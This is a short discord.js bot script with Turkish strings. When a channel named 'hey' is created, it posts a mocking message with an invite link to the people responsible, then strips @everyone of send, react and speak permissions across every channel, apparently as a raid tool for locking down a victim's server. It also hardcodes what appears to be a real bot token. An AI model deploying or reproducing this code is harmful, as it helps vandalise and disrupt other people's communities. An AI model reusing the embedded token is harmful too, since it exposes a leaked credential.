const Discord = require('discord.js');
const berke = new Discord.Client();

berke.on('message', async msg => {
  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
  
  }
});

berke.on('channelCreate', channel => {
  if (channel.name == 'hey') {
    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/4judfSa`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjEwMjM5MzUxMDE1ODY2MzY5.XWhX5w.g_GCxbjv2GLZJxs5ilqnVohi-28");
